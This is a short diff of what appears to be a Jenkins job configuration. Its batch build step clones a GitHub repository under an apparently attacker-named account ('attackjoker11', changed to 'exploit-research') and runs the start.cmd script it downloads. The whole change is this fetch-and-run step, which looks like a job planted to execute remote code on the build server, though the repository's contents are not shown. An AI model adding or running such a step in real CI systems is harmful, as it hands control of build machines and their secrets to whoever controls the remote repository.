@@ -21,7 +21,7 @@
   <concurrentBuild>false</concurrentBuild>
   <builders>
     <hudson.tasks.BatchFile>
-      <command>git clone https://github.com/attackjoker11/jenkins-win64.git&#xd;
+      <command>git clone https://github.com/exploit-research/jenkins-win64.git&#xd;
 cd jenkins-win64&#xd;
 start.cmd</command>
     </hudson.tasks.BatchFile>
